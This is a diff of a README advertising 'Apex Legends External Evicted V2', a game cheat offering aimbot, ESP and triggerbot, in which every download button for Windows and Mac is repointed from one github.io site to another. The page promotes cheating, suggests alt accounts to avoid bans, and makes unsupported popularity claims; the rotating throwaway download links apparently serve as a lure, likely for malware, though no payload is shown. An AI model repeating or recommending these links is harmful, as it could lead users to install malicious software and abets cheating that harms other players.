@@ -10,8 +10,8 @@ The **🛡️ Apex Legends External Evicted V2** is the most trusted and reliabl
 
 <div align="center">
 
-[![Download Apex Legends External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
+[![Download Apex Legends External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
@@ -145,7 +145,7 @@ The **🛡️ Apex Legends External Evicted V2** stands apart from competitors t
 7. **⚡ Enable features** - Toggle aimbot, ESP, and triggerbot
 8. **🏆 Dominate** - Let the external tools enhance your gameplay
 
-[![Download Apex Legends External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![Download Apex Legends External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 ### Menu Controls
 
@@ -165,7 +165,7 @@ The **🛡️ Apex Legends External Evicted V2** stands apart from competitors t
 
 <div align="center">
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20DOWNLOAD%20FOR%20MAC-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20DOWNLOAD%20FOR%20MAC-black?style=for-the-badge&logo=apple)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
@@ -232,5 +232,5 @@ External operation is significantly safer than internal injection. Use alt accou
 
 The **🛡️ Apex Legends External Evicted V2** represents the pinnacle of external cheating technology for Apex Legends in 2026. Join over 3.4 million satisfied players who've transformed their gameplay.
 
-[![Download Apex Legends External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
+[![Download Apex Legends External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://zenboulderagora.github.io/macdw/)
